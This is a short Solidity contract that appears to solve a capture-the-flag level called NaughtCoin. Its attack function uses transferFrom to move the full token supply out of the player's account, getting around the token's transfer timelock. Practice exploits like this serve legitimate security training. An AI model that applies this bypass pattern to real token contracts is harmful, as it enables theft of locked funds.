// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NaughtCoin} from "../contracts/15_NaughtCoin.sol";

contract NaughtCoinAttacker {
    uint256 private constant INITIAL_SUPPLY = 1000000 * (10 ** 18);
    NaughtCoin private naughtCoin;

    constructor(address _naughtCoinAddress) {
        naughtCoin = NaughtCoin(_naughtCoinAddress);
    }

    receive() external payable {}

    function attack() external {
        naughtCoin.transferFrom(msg.sender, address(this), INITIAL_SUPPLY);
    }

    function withdraw() external {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");

        if (!success) {
            revert();
        }
    }
}
